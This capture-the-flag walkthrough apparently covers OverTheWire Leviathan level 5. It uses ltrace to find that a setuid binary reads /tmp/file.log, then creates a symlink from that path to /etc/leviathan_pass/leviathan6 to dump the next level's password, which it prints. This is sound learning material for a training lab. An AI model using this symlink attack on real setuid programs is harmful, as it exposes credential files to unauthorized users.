**`leviathan5@gibson:~$ ls -la`**  
```
total 36
drwxr-xr-x  2 root       root        4096 Jan  8 17:07 .
drwxr-xr-x 83 root       root        4096 Jan  8 17:08 ..
-rw-r--r--  1 root       root         220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root        3771 Jan  6  2022 .bashrc
-r-sr-x---  1 leviathan6 leviathan5 15132 Jan  8 17:07 leviathan5
-rw-r--r--  1 root       root         807 Jan  6  2022 .profile
```

Looks like yet another setuid binary, this time owned by user `leviathan6`. Checking the library calls:

**`leviathan5@gibson:~$ ltrace ./leviathan5`**  
```
__libc_start_main(0x8049206, 1, 0xffffd5f4, 0 <unfinished ...>
fopen("/tmp/file.log", "r")                                                                                                                        = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                                                                                                                  = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
```

The setuid binary uses `fopen()` to open and read a file located at /tmp/file.log; however, if it can't read the file, it prints that it cannot find /tmp/file.log. Let's confirm the file doesn't exist: 

**`leviathan5@gibson:~$ cat /tmp/file.log`**  
*`cat: /tmp/file.log: No such file or directory`*  

Nice. Since the binary is owned by user `leviathan6`, we can use its permissions on files that `leviathan6` would have access to (hint: like the password file); however, the usage of the binary is set such that it will only open and read /tmp/file.log, which doesn't even exist yet. We can use this to our advantage by creating the file, and more rigorously, as a symbolic link to the leviathan6 password file:

**`leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log`**  
**`leviathan5@gibson:~$ ./leviathan5`**  
*`YZ55XPVk2l`*  
